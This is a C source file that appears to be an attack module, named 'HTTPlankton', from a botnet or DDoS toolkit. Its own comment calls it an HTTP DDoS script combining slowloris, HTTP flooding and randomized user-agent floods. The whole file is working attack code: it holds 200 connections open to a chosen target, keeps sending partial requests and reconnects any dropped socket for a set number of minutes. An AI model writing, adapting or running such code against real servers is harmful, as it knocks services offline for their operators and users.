#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>

/* HTTP DDoS script developed as a mix of slowloris,
    http flood, HTTP Randomized User-Agent Flood */
#include <dict.h>
#include <command.h>

#define CONNECTIONS 200
#define SLEEP_TIME 1 // seconds delay

int sockets[CONNECTIONS];

void setup_connection(int index, char *target_ip, int target_port)
{
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(target_port);
    server.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
#ifdef DEBUG
        perror("[HTTPlankton] Error during socket creation");
#endif
        return;
    }

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
#ifdef DEBUG
        perror("[HTTPlankton] Connection error");
#endif
        close(sock);
        return;
    }

    char request[1024];
    snprintf(request, sizeof(request),
             "GET / HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Accept-language: en-US,en,q=0.5\r\n",
             target_ip,
             get_random_user_agent());

    send(sock, request, strlen(request), 0);
    sockets[index] = sock;
}

void start_httplankton_attack(char *target_ip, int target_port, int duration)
{

    int duration_seconds = duration * 60; // Convert minutes to seconds
    time_t start = time(NULL);

#ifdef DEBUG
    printf("[HTTPlankton] Starting HTTPlankton attack on %s:%d for %d minutes\n", 
        target_ip, target_port, duration);
#endif

    for (int i = 0; i < CONNECTIONS; i++)
    {
        sockets[i] = -1;
        setup_connection(i, target_ip, target_port);

        if (sockets[i] == -1) 
        {
#ifdef DEBUG
            printf("[HTTPlankton] Failed to setup connection %d\n", i);
#endif
            continue;
        }
    }

    while (1)
    {
        time_t elapsed = time(NULL) - start;
        int remaining = duration - elapsed;
        
        if (elapsed >= duration_seconds) 
        {
#ifdef DEBUG
            printf("[HTTPlankton] Attack time completed (%d seconds). Stopping...\n", duration_seconds);
#endif
            break; 
        }
        
        for (int i = 0; i < CONNECTIONS; i++)
        {
            if (sockets[i] < 0)
            {
                close(sockets[i]);
                setup_connection(i, target_ip, target_port);

                if (sockets[i] < 0) 
                {
#ifdef DEBUG
                    printf("[HTTPlankton] Connection %d failed again\n", i);
#endif
                    continue;
                }
            }

            /* Send the first part of req without close it (slowloris) */
            const char *request = "GET / HTTP/1.1\r\nHost: target\r\nX-a: b\r\n\r\n";
            if (send(sockets[i], request, strlen(request), 0) < 0)
            {
                close(sockets[i]);
                setup_connection(i, target_ip, target_port);
            }
        }

#ifdef DEBUG
        printf("[HTTPlankton] Active connections... Continuing attack -%d seconds\n", duration_seconds - remaining);
#endif

        sleep(SLEEP_TIME); 
    }

#ifdef DEBUG
    printf("[HTTPlankton] Attack terminated after %d %s\n", 
        duration, duration > 1 ? "minutes" : "minute");
#endif

    for (int i = 0; i < CONNECTIONS; i++)
    {
        close(sockets[i]);
    }

    return;
}

